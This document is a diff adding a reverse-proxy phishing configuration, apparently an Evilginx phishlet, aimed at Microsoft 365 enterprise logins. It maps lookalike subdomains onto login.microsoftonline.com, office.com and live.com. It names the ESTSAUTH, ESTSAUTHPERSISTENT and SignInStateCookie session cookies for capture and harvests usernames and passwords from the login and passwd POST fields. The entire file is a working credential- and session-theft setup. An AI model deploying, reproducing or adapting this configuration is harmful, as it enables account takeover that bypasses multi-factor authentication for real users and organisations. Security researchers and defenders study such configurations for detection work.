@@ -1,0 +1,25 @@
+name: 'Microsoft 365 - Enterprise - V1'
+author: '@waelmas'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing: false}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH' , 'ESTSAUTHPERSISTENT' , 'SignInStateCookie']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/?auth=2'
